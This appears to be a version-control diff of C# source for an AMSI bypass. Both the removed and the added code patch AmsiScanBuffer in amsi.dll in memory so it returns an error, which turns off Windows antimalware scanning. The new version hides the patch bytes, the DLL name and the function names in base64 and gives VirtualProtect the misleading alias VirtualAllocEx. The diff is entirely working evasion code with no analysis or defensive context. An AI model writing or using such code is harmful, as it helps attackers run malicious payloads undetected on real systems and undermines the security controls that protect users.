@@ -1,35 +1,54 @@
-using System;
-using System.Runtime.InteropServices;
-
-namespace AMSIBYPASS
-{
-    public class Class1
+public class Amsi
     {
-
-        [DllImport("kernel32")]
-        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-        [DllImport("kernel32")]
-        public static extern IntPtr LoadLibrary(string name);
-        [DllImport("kernel32")]
-        public static extern IntPtr VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
-        
-
-        private static void copy(Byte[] Patch, IntPtr Address)
+        public static void Bypass()
         {
-            Marshal.Copy(Patch, 0, Address, 6);
+            string x64 = "uFcA";
+            x64 = x64 + "B4DD";
+            string x86 = "uFcAB4";
+            x86 = x86 + "DCGAA=";
+            if (is64Bit())
+                PatchA(Convert.FromBase64String(x64));
+            else
+                PatchA(Convert.FromBase64String(x86));
         }
-        public static void chaching()
-        {   
-
-            IntPtr Library = LoadLibrary("a" + "m" + "s" + "i.dl" + "l");            
-            IntPtr Address = GetProcAddress(Library, "Am" + "siSca" + "nBuf" + "fer");
-            
-            uint p;            
-            VirtualProtect(Address, (UIntPtr)5, 0x40, out p);
-            Byte[] Patch= { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
-
-            copy(Patch, Address);
-            Console.WriteLine("TRUHE");
+        private static void PatchA(byte[] patch)
+        {
+            try
+            {
+                string liba = Encoding.Default.GetString(Convert.FromBase64String("YW1zaS5kbGw="));
+                var lib = Win32.LoadLibraryA(ref liba);//Amsi.dll
+                string addra = Encoding.Default.GetString(Convert.FromBase64String("QW1zaVNjYW5CdWZmZXI="));
+                var addr = Win32.GetProcAddress(lib, ref addra);//AmsiScanBuffer
+                uint oldProtect;
+                Win32.VirtualAllocEx(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
+                Marshal.Copy(patch, 0, addr, patch.Length);
+            }
+            catch (Exception e)
+            {
+                Console.WriteLine(" [x] {0}", e.Message);
+                Console.WriteLine(" [x] {0}", e.InnerException);
+            }
+        }
+        private static bool is64Bit()
+        {
+            bool is64Bit = true;
+            if (IntPtr.Size == 4)
+                is64Bit = false;
+            return is64Bit;
         }
     }
-}
+    class Win32
+    {
+        public static readonly DelegateVirtualProtect VirtualAllocEx = LoadApi<DelegateVirtualProtect>("kernel32", Encoding.Default.GetString(Convert.FromBase64String("VmlydHVhbFByb3RlY3Q=")));//VirtualProtect
+        public delegate int DelegateVirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        #region CreateAPI
+        [DllImport("kernel32", SetLastError = true)]
+        public static extern IntPtr LoadLibraryA([MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+        [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true, ExactSpelling = true)]
+        public static extern IntPtr GetProcAddress(IntPtr hProcess, [MarshalAs(UnmanagedType.VBByRefStr)] ref string Name);
+        public static CreateApi LoadApi<CreateApi>(string name, string method)
+        {
+            return (CreateApi)(object)Marshal.GetDelegateForFunctionPointer(GetProcAddress(LoadLibraryA(ref name), ref method), typeof(CreateApi));
+        }
+        #endregion
+    }
